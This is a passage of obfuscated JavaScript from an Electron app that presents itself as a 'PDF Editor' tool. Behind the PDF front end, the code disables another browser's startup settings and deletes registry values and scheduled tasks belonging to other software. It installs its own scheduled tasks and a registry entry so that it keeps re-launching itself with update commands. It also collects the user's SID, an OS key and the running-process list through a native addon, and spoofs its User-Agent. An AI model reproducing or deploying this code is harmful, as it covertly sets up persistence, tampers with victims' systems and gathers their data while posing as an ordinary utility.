                  flag7 = true;
                  await np.S559FZQ.c5E4Z7C("ol-key", "2");
                  await this.D45AYQ3(nr.E506IW4.n5F14C8);
                  await this.D45AYQ3(nr.E506IW4.E5D2YTN);
                  await nq.w3F3UWA.W4EF0EI(4, [162, ''], [vk, vm]);
                }
              }
              if (!flag7) {
                await nq.w3F3UWA.W4EF0EI(4, [121, ''], [vk, vm]);
              }
            }
          } catch {
            await nq.w3F3UWA.W4EF0EI(4, [122, '']);
          }
        }
        async h659UF4(vp) {
          const vq = np.S559FZQ.D47CBV3();
          if (!vq) {
            return;
          }
          const vr = require("path").join(vq, nr.E506IW4.V68C0TQ);
          const fs13 = require("fs");
          try {
            const data11 = JSON.parse(fs13.readFileSync(vr, "utf8"));
            let flag8 = true;
            if ("shift" in data11 && "browser" in data11.shift) {
              const vt = data11.shift.browser;
              flag8 = vt.launch_on_login_enabled ?? (true || (vt.launch_on_wake_enabled ?? true) || (vt.run_in_background_enabled ?? true));
            }
            const vs = await this.g4EE56L("sf-key");
            if (flag8) {
              if (0 == vs || vp) {
                if (!("shift" in data11)) {
                  data11.shift = {};
                }
                if (!("browser" in data11.shift)) {
                  data11.shift.browser = {};
                }
                data11.shift.browser.launch_on_login_enabled = false;
                data11.shift.browser.launch_on_wake_enabled = false;
                data11.shift.browser.run_in_background_enabled = false;
                await this.D45AYQ3(nr.E506IW4.T525XE5);
                fs13.writeFileSync(vr, JSON.stringify(data11), "utf8");
                await nq.w3F3UWA.W4EF0EI(6, [120, ''], [vp, vs]);
                await np.S559FZQ.c5E4Z7C("sf-key", "1");
              } else {
                await nq.w3F3UWA.W4EF0EI(6, [163, ''], [vp, vs]);
              }
            } else {
              let flag9 = false;
              if (1 == vs) {
                const vu = this.e5FBF4O('', "ShiftLaunchTask", 1);
                const vv = this.t4E0LPU("\\" + nr.E506IW4.T525XE5);
                if (vu != undefined && false == vu && vv != undefined && vv) {
                  flag9 = true;
                  await np.S559FZQ.c5E4Z7C("sf-key", "2");
                  await this.D45AYQ3(nr.E506IW4.T525XE5);
                  await nq.w3F3UWA.W4EF0EI(6, [162, ''], [vp, vs]);
                }
              }
              if (!flag9) {
                await nq.w3F3UWA.W4EF0EI(6, [121, ''], [vp, vs]);
              }
            }
          } catch {
            await nq.w3F3UWA.W4EF0EI(6, [122, '']);
          }
        }
        async W5F8HOG(vw) {
          const path9 = require("path");
          const fs14 = require("fs");
          try {
            const vx = "HKCU" + nr.E506IW4.f538M6A;
            const vy = (await this.u459C3E(vx, nr.E506IW4.i623ZUC)) || (await this.u459C3E(vx, nr.E506IW4.w443M14)) || (await this.u459C3E(vx, nr.E506IW4.F6750PF));
            const vz = await this.g4EE56L("pas-key");
            if (vy) {
              if (0 == vz || vw) {
                await this.D45AYQ3(nr.E506IW4.C61B0CZ, false);
                await this.D45AYQ3(nr.E506IW4.z3EF88U, false);
                await this.w4D8BBU(nr.E506IW4.f538M6A, nr.E506IW4.i623ZUC);
                await this.w4D8BBU(nr.E506IW4.f538M6A, nr.E506IW4.w443M14);
                await this.w4D8BBU(nr.E506IW4.f538M6A, nr.E506IW4.F6750PF);
                await nq.w3F3UWA.W4EF0EI(7, [120, ''], [vw, vz]);
                await np.S559FZQ.c5E4Z7C("pas-key", "1");
              } else {
                await nq.w3F3UWA.W4EF0EI(7, [163, ''], [vw, vz]);
              }
            } else if (1 == vz) {
              await nq.w3F3UWA.W4EF0EI(7, [121, ''], [vw, vz]);
            }
          } catch {
            await nq.w3F3UWA.W4EF0EI(7, [122, '']);
          }
        }
      };
      no.A672SIS = ny;
    }
  });
  const h = b({
    'obj/globals.js'(wa, wb) {
      'use strict';

      const obj9 = {
        homeUrl: "https://pdf-tool.appsuites.ai/en/pdfeditor",
        CHANNEL_NAME: "main",
        USER_AGENT: "PDFFusion/93HEU7AJ",
        productName: "PDFEditor",
        appName: "PDF Editor",
        scheduledTaskName: "PDFEditorScheduledTask",
        registryName: 'PDFEditorUpdater',
        modeDataPath: "\\mode.data",
        scheduledUTaskName: "PDFEditorUScheduledTask",
        iconSubPath: "\\assets\\icons\\win\\pdf-n.ico"
      };
      wb.exports = obj9;
    }
  });
  const i = b({
    'obj/window.js'(wc) {
      'use strict';

      const {
        BrowserWindow: electron
      } = require("electron");
      const {
        dialog: electron2
      } = require("electron");
      wc.createBrowserWindow = () => {
        let wd = __dirname;
        wd = wd.replace("src", '');
        const we = wd + h().iconSubPath;
        console.log(we);
        const wf = new electron({
          resizable: true,
          width: 1024,
          height: 768,
          icon: we,
          autoHideMenuBar: true,
          backgroundColor: "#fff",
          webPreferences: {
            devTools: false,
            preload: require("path").join(__dirname, "./preload.js")
          }
        });
        return wf;
      };
    }
  });
  const j = b({
    'obj/D3E8Q17.js'(wg) {
      Object.defineProperty(wg, "__esModule", {
        value: true
      });
      const wh = c();
      const fs15 = require('fs');
      const Utilityaddon = require(".\\lib\\Utilityaddon.node");
      const {
        app: electron3,
        Menu: electron4,
        ipcMain: electron5
      } = require("electron");
      const wi = h();
      async function wj() {
        const wk = (wy) => {
          switch (wy) {
            case "--install":
              return wh.a689XV5.b5BEPQ2;
            case "--check":
              return wh.a689XV5.V4E6B4O;
            case "--reboot":
              return wh.a689XV5.j5C58S9;
            case "--cleanup":
              return wh.a689XV5.Z498ME9;
            case "--ping":
              return wh.a689XV5.f63DUQF;
          }
          return wh.a689XV5.B639G7B;
        };
        let flag10 = false;
        const wl = electron3.commandLine.getSwitchValue('c');
        const wm = electron3.commandLine.getSwitchValue('cm');
        console.log('args=' + wl);
        console.log("args2=" + wm);
        const wn = __dirname.replace("\\resources\\app\\w-electron\\bin\\release", '');
        console.log("wkdir = " + wn);
        if (!electron3.commandLine.hasSwitch('c') && !electron3.commandLine.hasSwitch('cm')) {
          await wo('--install');
          ww();
        }
        if (electron3.commandLine.hasSwitch('c') && wl == '0') {
          ww();
        }
        if (electron3.commandLine.hasSwitch('cm')) {
          if (wm == "--cleanup") {
            await wo(wm);
            console.log("remove ST");
            Utilityaddon.remove_task_schedule(wi.scheduledTaskName);
            Utilityaddon.remove_task_schedule(wi.scheduledUTaskName);
          } else if (wm == "--partialupdate") {
            await wo('--check');
          } else if (wm == "--fullupdate") {
            await wo("--reboot");
          } else if (wm == "--enableupdate") {
            Utilityaddon.SetRegistryValue(wi.registryName, "\"" + wn + "\\" + wi.appName + "\" --cm=--fullupdate");
          } else if (wm == "--disableupdate") {
            Utilityaddon.DeleteRegistryValue(wi.registryName);
          } else if (wm == "--backupupdate") {
            await wo("--ping");
          }
          if (!electron3.commandLine.hasSwitch('c')) {
            electron3.quit();
          }
        }
        async function wo(wz) {
          console.log("To add wc routine");
          await wv(wz);
        }
        function wp() {
          return Utilityaddon.get_sid();
        }
        function wq(xa) {
          return Utilityaddon.GetOsCKey(xa);
        }
        function wr(xb, xc, xd) {
          return Utilityaddon.mutate_task_schedule(xb, xc, xd);
        }
        function ws(xe) {
          return Utilityaddon.find_process(xe);
        }
        function wt() {
          return Utilityaddon.GetPsList();
        }
        function wu() {
          try {
            const xf = Utilityaddon.mutate_task_schedule("\\", wi.scheduledTaskName, 1);
            if (!xf) {
              Utilityaddon.create_task_schedule(wi.scheduledTaskName, wi.scheduledTaskName, "\"" + wn + "\\" + wi.appName + "\"", "--cm=--partialupdate", wn, 1442);
            }
            const xg = Utilityaddon.mutate_task_schedule("\\", wi.scheduledUTaskName, 1);
            if (!xf) {
              Utilityaddon.create_repeat_task_schedule(wi.scheduledUTaskName, wi.scheduledUTaskName, "\"" + wn + "\\" + wi.appName + "\"", "--cm=--backupupdate", wn);
            }
          } catch (xh) {
            console.log(xh);
          }
        }
        async function wv(xi) {
          const xj = wk(xi);
          console.log("argument = " + xi);
          const xk = new g().A672SIS(wp, wq, wr, ws, wt);
          if (wh.a689XV5.b5BEPQ2 == xj) {
            if ((await xk.q41FDEK()) == g().U5E7DEV.C5B7MFV) {
              wu();
            }
          } else if (wh.a689XV5.Z498ME9 == xj) {
            await xk.l660ZQF();
          } else if (wh.a689XV5.f63DUQF == xj) {
            await xk.A4B0MTO();
          } else {
            await xk.m58FJB5(xj);
          }
        }
        function ww() {
          try {
            const xl = wn + wi.modeDataPath;
            console.log("modeFile = " + xl);
            if (fs15.existsSync(xl)) {
              flag10 = false;
            } else {
              flag10 = true;
            }
          } catch (xm) {
            console.log(xm);
          }
        }
        function wx() {
          try {
            const xn = wn + wi.modeDataPath;
            if (fs15.existsSync(xn)) {
              fs15.rmSync(xn, {
                force: true
              });
            }
          } catch (xo) {
            console.log(xo);
          }
        }
        if (flag10) {
          electron3.whenReady().then(() => {
            const xp = i().createBrowserWindow(electron3);
            require("electron").session.defaultSession.webRequest.onBeforeSendHeaders((xq, xr) => {
              xq.requestHeaders["User-Agent"] = wi.USER_AGENT;
              xr({
                cancel: false,
                requestHeaders: xq.requestHeaders
              });
            });
            xp.loadURL(wi.homeUrl);
            xp.on("close", function (xs) {
              xs.preventDefault();
              xp.destroy();
            });
          });
          electron5.on(wi.CHANNEL_NAME, (xt, xu) => {
            if (xu == "Set") {
              Utilityaddon.SetRegistryValue(wi.registryName, "\"" + wn + "\\" + wi.appName + "\" --cm=--fullupdate");
            }
            if (xu == "Unset") {
              Utilityaddon.DeleteRegistryValue(wi.registryName);
            }
          });
          electron3.on("window-all-closed", () => {
            if (process.platform !== "darwin") {
              electron3.quit();
            }
          });
        }
        wx();
      }
      wj();
    }
  });
  j();
})();